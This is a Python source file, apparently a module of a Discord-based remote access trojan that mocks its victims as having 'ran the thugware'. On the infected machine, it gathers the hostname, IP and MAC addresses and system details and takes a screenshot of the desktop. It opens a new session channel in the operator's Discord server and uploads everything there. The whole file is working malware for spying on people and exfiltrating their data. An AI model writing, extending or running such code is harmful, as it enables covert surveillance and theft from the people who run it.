import socket
import psutil
import platform
import requests
import discord
from PIL import ImageGrab
import io

async def start_messagesend(bot, guild):
    def get_ip_addresses():
        private_ip = socket.gethostbyname(socket.gethostname())
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except requests.RequestException:
            public_ip = 'Could not retrieve public IP'
        return private_ip, public_ip

    def get_mac_address():
        for addresses in psutil.net_if_addrs().values():
            for address in addresses:
                if address.family == psutil.AF_LINK:
                    return address.address
        return 'Could not retrieve MAC address'

    def get_system_info():
        uname = platform.uname()
        return {
            'System': uname.system,
            'Node Name': uname.node,
            'Release': uname.release,
            'Version': uname.version,
            'Machine': uname.machine,
            'Processor': uname.processor,
            'RAM': f"{round(psutil.virtual_memory().total / 1024 ** 3)} GB"
        }

    def take_screenshot():
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        return img_byte_arr

    def create_rich_embed(guild_name, screenshot_img):
        system_info = get_system_info()
        private_ip, public_ip = get_ip_addresses()
        mac_address = get_mac_address()

        embed = discord.Embed(
            title='System Information',
            description=f"Extensive system information for guild: **{guild_name}**",
            color=16734003
        )
        embed.add_field(name='💻 System', value=system_info['System'], inline=True)
        embed.add_field(name='🔠 Node Name', value=system_info['Node Name'], inline=True)
        embed.add_field(name='🔧 Release', value=system_info['Release'], inline=True)
        embed.add_field(name='🛠 Version', value=system_info['Version'], inline=True)
        embed.add_field(name='🏷 Machine', value=system_info['Machine'], inline=True)
        embed.add_field(name='🧠 Processor', value=system_info['Processor'], inline=True)
        embed.add_field(name='💾 RAM', value=system_info['RAM'], inline=True)
        embed.add_field(name='🔒 MAC Address', value=mac_address, inline=True)
        embed.add_field(name='🔐 Private IP', value=private_ip, inline=True)
        embed.add_field(name='🌐 Public IP', value=public_ip, inline=True)
        embed.set_image(url='attachment://screenshot.png')

        return embed

    async def send_system_info_message(channel):
        screenshot_img = take_screenshot()
        embed = create_rich_embed(channel.guild.name, screenshot_img)
        await channel.send(f'@everyone {socket.gethostname()} ran the thugware! What an idiot.', embed=embed, file=discord.File(fp=screenshot_img, filename='screenshot.png'))

    try:
        if guild.me.guild_permissions.manage_channels:
            current_channels_count = sum(1 for _ in guild.text_channels)
            channel_name = f'session{current_channels_count + 1}'
            channel = await guild.create_text_channel(channel_name)

            bot.allowed_channel_ids[guild.id] = channel.id

            await send_system_info_message(channel)
        else:
            print(missing_permissions_message(guild.name))
    except discord.Forbidden as e:
        print(handle_permission_error(guild.name, e))
    except discord.HTTPException as e:
        print(handle_http_error(guild.name, e))
    except Exception as e:
        print(handle_generic_error(guild.name, e))

def handle_permission_error(guild_name, error):
    return f"Permission error in guild {guild_name}: {error}"

def handle_http_error(guild_name, error):
    return f"HTTP error in guild {guild_name}: {error}"

def handle_generic_error(guild_name, error):
    return f"An error occurred in guild {guild_name}: {error}"

def missing_permissions_message(guild_name):
    return f"Missing permissions to manage channels in guild: {guild_name}"
